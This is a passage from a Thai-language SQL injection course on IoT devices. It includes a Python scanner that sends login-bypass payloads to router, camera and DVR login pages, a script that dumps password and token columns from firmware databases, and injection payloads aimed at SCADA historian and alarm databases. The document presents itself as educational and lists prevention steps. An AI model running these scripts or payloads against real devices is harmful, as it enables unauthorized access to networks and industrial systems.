# Part 062: SQL Injection ใน IoT Devices

## ภาพรวม

อุปกรณ์ IoT มักมีฐานข้อมูล SQLite/MySQL ที่มีช่องโหว่ SQL injection และอัพเดตยาก

**ขั้นตอนที่ 1001-1015**

---

## 1001. IoT Database Landscape

```
อุปกรณ์ IoT ที่ใช้ database:
- Smart routers: SQLite สำหรับ config/logs
- IP cameras: SQLite สำหรับ user management
- Smart TVs: SQLite/MySQL สำหรับ apps
- Industrial controllers (SCADA): SQL Server
- Medical devices: SQLite/proprietary
- Building management systems: MySQL/MSSQL

ช่องทาง injection:
- Web management interface
- REST API
- SNMP community strings
- Custom protocols over TCP
- Firmware web servers (lighttpd, mini_httpd)
```

---

## 1002. Router/IP Camera SQLi

```python
import requests

# Common IoT web interfaces
IOT_TARGETS = [
    ('Router admin', '/admin/login.asp', {'username': '', 'password': ''}),
    ('Camera login', '/login.cgi', {'user': '', 'pass': ''}),
    ('DVR interface', '/login', {'username': '', 'password': ''}),
]

def test_iot_sqli(host: str, port: int = 80):
    base_url = f'http://{host}:{port}'
    payloads = [
        "admin' --",
        "' OR '1'='1",
        "admin'/*",
        "' OR 1=1#",
    ]
    
    for name, path, param_template in IOT_TARGETS:
        for payload in payloads:
            params = param_template.copy()
            for key in params:
                params[key] = payload
                try:
                    r = requests.post(
                        base_url + path,
                        data=params,
                        timeout=5,
                        verify=False
                    )
                    # IoT มัก redirect เมื่อ login สำเร็จ
                    if r.status_code in [200, 302] and len(r.text) > 500:
                        if any(kw in r.text.lower() for kw in 
                               ['logout', 'dashboard', 'admin', 'settings', 'config']):
                            print(f"[+] {name} bypass at {path}: {payload}")
                except Exception:
                    pass
                finally:
                    params[key] = ''

# test_iot_sqli('192.168.1.1')
```

---

## 1003. SQLite ใน IoT Firmware

```python
import sqlite3
import os

# วิเคราะห์ firmware extracted SQLite databases
def analyze_iot_sqlite(db_path: str):
    """Analyze SQLite DB from extracted IoT firmware"""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # ดูตารางทั้งหมด
    cursor.execute("SELECT name, sql FROM sqlite_master WHERE type='table'")
    tables = cursor.fetchall()
    
    print(f"Tables in {os.path.basename(db_path)}:")
    for name, ddl in tables:
        print(f"  {name}")
        
        # หาคอลัมน์ที่น่าสนใจ
        sensitive_cols = ['password', 'passwd', 'pass', 'secret', 'key', 'token', 'hash']
        if ddl and any(c in ddl.lower() for c in sensitive_cols):
            print(f"    [!] Contains sensitive columns!")
            cursor.execute(f"SELECT * FROM {name} LIMIT 5")
            rows = cursor.fetchall()
            for row in rows:
                print(f"    {row}")
    
    conn.close()

# Binwalk สำหรับ extract firmware:
# binwalk -e firmware.bin
# find _firmware.bin.extracted -name '*.db' -o -name '*.sqlite'
```

---

## 1004. SCADA/ICS Database Attacks

```sql
-- SCADA systems มักใช้ MSSQL/MySQL
-- การตรวจสอบ:

-- historian database (process data)
SELECT TOP 10 TagName, Value, TimeStamp 
FROM ArchiveTable
WHERE TagName = '' OR '1'='1'--

-- alarm management
SELECT * FROM AlarmLog WHERE Priority > 0 
UNION SELECT 1,username,password,4,5,6 FROM users--

-- คำเตือน: SCADA attacks อาจเป็นอันตรายต่อชีวิต (โรงงาน, ไฟฟ้า, น้ำ)
-- ทดสอบเฉพาะใน authorized environments
```

---

## สรุป

IoT SQL Injection:
- **Routers/Cameras** - web interface bypass
- **Firmware SQLite** - extract + analyze
- **SCADA** - historian/alarm DB injection
- **Prevention** - update firmware, disable remote admin, network segmentation

---

*Part 062 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
